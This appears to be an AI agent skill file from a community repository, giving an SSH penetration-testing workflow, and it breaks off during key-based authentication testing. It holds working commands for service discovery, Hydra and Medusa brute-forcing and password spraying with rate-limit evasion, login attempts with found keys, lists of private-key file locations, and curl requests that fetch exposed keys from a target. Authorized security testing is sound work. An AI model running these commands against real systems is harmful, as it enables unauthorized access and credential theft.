     1|---
     2|name: ag-ssh-penetration-testing
     3|description: "Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-e"
     4|version: 1.0.0
     5|tags: [antigravity, security]
     6|category: software-development
     7|source: https://github.com/sickn33/antigravity-awesome-skills
     8|---
     9|
    10|---
    11|name: ssh-penetration-testing
    12|description: "Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security."
    13|risk: offensive
    14|source: community
    15|author: zebbern
    16|date_added: "2026-02-27"
    17|---
    18|
    19|> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
    20|
    21|# SSH Penetration Testing
    22|
    23|## Purpose
    24|
    25|Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security.
    26|
    27|## Prerequisites
    28|
    29|### Required Tools
    30|- Nmap with SSH scripts
    31|- Hydra or Medusa for brute-forcing
    32|- ssh-audit for configuration analysis
    33|- Metasploit Framework
    34|- Python with Paramiko library
    35|
    36|### Required Knowledge
    37|- SSH protocol fundamentals
    38|- Public/private key authentication
    39|- Port forwarding concepts
    40|- Linux command-line proficiency
    41|
    42|## Outputs and Deliverables
    43|
    44|1. **SSH Enumeration Report** - Versions, algorithms, configurations
    45|2. **Credential Assessment** - Weak passwords, default credentials
    46|3. **Vulnerability Assessment** - Known CVEs, misconfigurations
    47|4. **Tunnel Documentation** - Port forwarding configurations
    48|
    49|## Core Workflow
    50|
    51|### Phase 1: SSH Service Discovery
    52|
    53|Identify SSH services on target networks:
    54|
    55|```bash
    56|# Quick SSH port scan
    57|nmap -p 22 192.168.1.0/24 --open
    58|
    59|# Common alternate SSH ports
    60|nmap -p 22,2222,22222,2200 192.168.1.100
    61|
    62|# Full port scan for SSH
    63|nmap -p- --open 192.168.1.100 | grep -i ssh
    64|
    65|# Service version detection
    66|nmap -sV -p 22 192.168.1.100
    67|```
    68|
    69|### Phase 2: SSH Enumeration
    70|
    71|Gather detailed information about SSH services:
    72|
    73|```bash
    74|# Banner grabbing
    75|nc 192.168.1.100 22
    76|# Output: SSH-2.0-OpenSSH_8.4p1 Debian-5
    77|
    78|# Telnet banner grab
    79|telnet 192.168.1.100 22
    80|
    81|# Nmap version detection with scripts
    82|nmap -sV -p 22 --script ssh-hostkey 192.168.1.100
    83|
    84|# Enumerate supported algorithms
    85|nmap -p 22 --script ssh2-enum-algos 192.168.1.100
    86|
    87|# Get host keys
    88|nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100
    89|
    90|# Check authentication methods
    91|nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
    92|```
    93|
    94|### Phase 3: SSH Configuration Auditing
    95|
    96|Identify weak configurations:
    97|
    98|```bash
    99|# ssh-audit - comprehensive SSH audit
   100|ssh-audit 192.168.1.100
   101|
   102|# ssh-audit with specific port
   103|ssh-audit -p 2222 192.168.1.100
   104|
   105|# Output includes:
   106|# - Algorithm recommendations
   107|# - Security vulnerabilities
   108|# - Hardening suggestions
   109|```
   110|
   111|Key configuration weaknesses to identify:
   112|- Weak key exchange algorithms (diffie-hellman-group1-sha1)
   113|- Weak ciphers (arcfour, 3des-cbc)
   114|- Weak MACs (hmac-md5, hmac-sha1-96)
   115|- Deprecated protocol versions
   116|
   117|### Phase 4: Credential Attacks
   118|
   119|#### Brute-Force with Hydra
   120|
   121|```bash
   122|# Single username, password list
   123|hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
   124|
   125|# Username list, single password
   126|hydra -L users.txt -p Password123 ssh://192.168.1.100
   127|
   128|# Username and password lists
   129|hydra -L users.txt -P passwords.txt ssh://192.168.1.100
   130|
   131|# With specific port
   132|hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
   133|
   134|# Rate limiting evasion (slow)
   135|hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100
   136|
   137|# Verbose output
   138|hydra -l admin -P passwords.txt -vV ssh://192.168.1.100
   139|
   140|# Exit on first success
   141|hydra -l admin -P passwords.txt -f ssh://192.168.1.100
   142|```
   143|
   144|#### Brute-Force with Medusa
   145|
   146|```bash
   147|# Basic brute-force
   148|medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
   149|
   150|# Multiple targets
   151|medusa -H targets.txt -u admin -P passwords.txt -M ssh
   152|
   153|# With username list
   154|medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh
   155|
   156|# Specific port
   157|medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
   158|```
   159|
   160|#### Password Spraying
   161|
   162|```bash
   163|# Test common password across users
   164|hydra -L users.txt -p Summer2024! ssh://192.168.1.100
   165|
   166|# Multiple common passwords
   167|for pass in "Password123" "Welcome1" "Summer2024!"; do
   168|    hydra -L users.txt -p "$pass" ssh://192.168.1.100
   169|done
   170|```
   171|
   172|### Phase 5: Key-Based Authentication Testing
   173|
   174|Test for weak or exposed keys:
   175|
   176|```bash
   177|# Attempt login with found private key
   178|ssh -i id_rsa user@192.168.1.100
   179|
   180|# Specify key explicitly (bypass agent)
   181|ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100
   182|
   183|# Force password authentication
   184|ssh -o PreferredAuthentications=password user@192.168.1.100
   185|
   186|# Try common key names
   187|for key in id_rsa id_dsa id_ecdsa id_ed25519; do
   188|    ssh -i "$key" user@192.168.1.100
   189|done
   190|```
   191|
   192|Check for exposed keys:
   193|
   194|```bash
   195|# Common locations for private keys
   196|~/.ssh/id_rsa
   197|~/.ssh/id_dsa
   198|~/.ssh/id_ecdsa
   199|~/.ssh/id_ed25519
   200|/etc/ssh/ssh_host_*_key
   201|/root/.ssh/
   202|/home/*/.ssh/
   203|
   204|# Web-accessible keys (check with curl/wget)
   205|curl -s http://target.com/.ssh/id_rsa
   206|curl -s http://target.com/id_rsa
   207|curl -s http://target.com/backup/ssh_keys.tar.gz
   208|```
   209|